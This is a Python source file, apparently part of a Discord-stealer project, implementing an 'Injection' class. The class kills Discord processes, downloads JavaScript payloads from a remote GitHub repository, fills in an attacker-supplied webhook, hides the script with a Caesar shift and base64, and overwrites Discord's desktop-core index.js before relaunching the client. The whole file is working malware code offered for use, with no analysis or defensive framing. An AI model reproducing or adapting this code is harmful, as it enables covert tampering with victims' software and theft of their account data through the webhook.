import os
import random
import re
import socket
import subprocess
import sys
from base64 import b64encode

import psutil
import requests
import urllib3


class Injection:
    def __init__(self, webhook: str):
        local = os.getenv("localappdata")

        self.discordRunning = False
        self.discords = [
            f"{local}\\Discord"
        ]

        self.base = requests.get("https://raw.githubusercontent.com/XoQ2988/LuvdU/master/js/base.js").text
        self.code = requests.get("https://raw.githubusercontent.com/XoQ2988/LuvdU/master/js/inject.js").text

        for proc in psutil.process_iter():
            if "discord" in proc.name().lower():
                self.discordRunning = True
                proc.kill()

        for d in self.discords:
            if not os.path.exists(d):
                continue

            if self.getCore(d) is not None:
                with open(f"{self.getCore(d)[0]}\\index.js", "w", encoding="utf-8") as f:
                    f.write(self.hideJS(self.code.replace("%WEBHOOK%", webhook)))
                    f.close()
                if self.discordRunning:
                    self.startDiscordDir(d)



    def hideJS(self, script):
        alpha = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
        key = ''.join(random.sample(alpha, 2))
        gap = sum(ord(c) for c in key) % 26
        caeser = ''
        for c in script:
            if c.isalpha():
                if c.islower():
                    cInt = chr((ord(c) - 97 + gap) % 26 + 97)
                else:
                    cInt = chr((ord(c) - 65 + gap) % 26 + 65)
            else:
                cInt = c
            caeser += cInt
        obfStr = str(caeser + key)
        byte = obfStr.encode('UTF-8')
        text = b64encode(byte)
        js = self.base.replace('%SCRIPT%', text.decode('UTF-8'))
        return js

    # noinspection PyAssignmentToLoopOrWithParameter
    @staticmethod
    def getCore(d: str) -> tuple:
        for f in os.listdir(d):
            if re.search(r'app-+?', f):
                modules = d + '\\' + f + '\\modules'
                if not os.path.exists(modules):
                    continue

                for f in os.listdir(modules):
                    if re.search(r'discord_desktop_core-+?', f):
                        core = modules + '\\' + f + '\\' + 'discord_desktop_core'
                        if not os.path.exists(core + '\\index.js'):
                            continue

                        return core, f

    @staticmethod
    def startDiscordDir(path: str) -> None:
        updatePath = f"{path}\\Update.exe"
        exeName = path.split('\\')[-1] + ".exe"

        for file in os.listdir(path):
            if re.search(r"app-+?", file):
                app = f"{path}\\{file}"

                if os.path.exists(f"{app}\\modules"):
                    for file in os.listdir(app):
                        if file == exeName:
                            exePath = f"{app}\\{exeName}"
                            subprocess.call([updatePath, "--processStart", exePath],
                                            shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)


if __name__ == '__main__':
    print(sys.path[1])
